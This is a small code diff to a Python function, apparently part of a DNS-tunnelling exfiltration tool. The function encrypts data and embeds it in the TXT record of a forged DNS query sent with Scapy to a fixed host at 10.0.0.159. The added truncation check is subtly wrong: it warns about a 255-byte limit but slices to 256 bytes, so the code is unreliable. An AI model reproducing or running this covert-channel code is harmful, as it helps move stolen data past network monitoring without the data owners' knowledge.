@@ -44,6 +44,10 @@ def forge_dns_query(data: str):
     hostname = get_random_hostname()
     # Encrypt data
     encrypted_data = e.encrypt(data.encode("utf-8"))
+    if len(encrypted_data) > 255:
+        print("ERROR: Can't fit more than 255 bytes in TXT record!")
+        print("Truncating data...")
+        encrypted_data = encrypted_data[0:256]
     # Forge the DNS packet with data in the text record.
     query = IP(dst="10.0.0.159")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
     return query
